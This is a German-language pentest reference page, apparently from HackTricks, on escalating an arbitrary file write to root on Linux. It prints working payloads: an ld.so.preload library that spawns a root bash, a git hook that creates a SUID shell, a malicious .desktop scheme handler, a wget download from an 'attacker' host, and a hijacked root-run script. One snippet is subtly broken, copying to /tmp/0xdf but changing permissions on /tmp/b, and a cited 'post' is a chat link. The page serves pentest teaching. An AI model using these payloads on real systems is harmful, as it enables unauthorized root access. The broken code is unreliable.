# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die **`LD_PRELOAD`** env variable, funktioniert aber auch in **SUID binaries**.\
Wenn du sie erstellen oder ändern kannst, kannst du einfach einen **path zu einer library hinzufügen, die bei jedem ausgeführten binary geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository ausgeführt werden, z. B. wenn ein commit erstellt wird, ein merge... Wenn also ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, in den `.git`-Ordner zu **schreiben**, kann dies zur **privesc** genutzt werden.

Zum Beispiel ist es möglich, in einem Git-Repo unter **`.git/hooks`** ein **Skript zu erzeugen**, das bei jedem neuen commit ausgeführt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron- & Zeitdateien

TODO

### Service- & Socket-Dateien

TODO

### binfmt_misc

Die Datei unter `/proc/sys/fs/binfmt_misc` zeigt an, welches Binary welchen Dateityp ausführen soll. TODO: prüfe die Voraussetzungen, um dies auszunutzen, um eine rev shell auszuführen, wenn ein gängiger Dateityp geöffnet ist.

### Overwrite schema handlers (like http: or https:)

Ein Angreifer mit Schreibrechten auf die Konfigurationsverzeichnisse eines Opfers kann problemlos Dateien ersetzen oder erstellen, die das Systemverhalten ändern und zu ungewollter Codeausführung führen. Durch das Ändern der Datei `$HOME/.config/mimeapps.list`, sodass die HTTP- und HTTPS-URL-Handler auf eine bösartige Datei zeigen (z. B. durch Setzen von `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **ein Klick auf einen beliebigen http- oder https-Link den in dieser `evil.desktop`-Datei angegebenen Code ausführt**. Zum Beispiel führt nach dem Ablegen des folgenden bösartigen Codes in `evil.desktop` in `$HOME/.local/share/applications` jeder externe URL-Klick den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Für mehr Informationen siehe [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), in dem es verwendet wurde, um eine reale Schwachstelle auszunutzen.

### Root führt vom Benutzer beschreibbare Skripte/Binaries aus

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` (oder irgendein Binary innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört) ausführt, kannst du es hijacken:

- **Erkennung der Ausführung:** Prozesse mit [pspy](https://github.com/DominicBreuker/pspy) überwachen, um root beim Aufrufen von vom Benutzer kontrollierten Pfaden zu erwischen:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und beschreibbar sind.
- **Hijack the target:** Sichere das originale Binary/Script und lege eine Payload ab, die eine SUID shell erzeugt (oder eine andere root action), und stelle dann die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. das Drücken eines UI-Buttons, der den Helper startet). Wenn root den hijacked path erneut ausführt, erhalte die escalated shell mit `./rootshell -p`.

## Referenzen

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
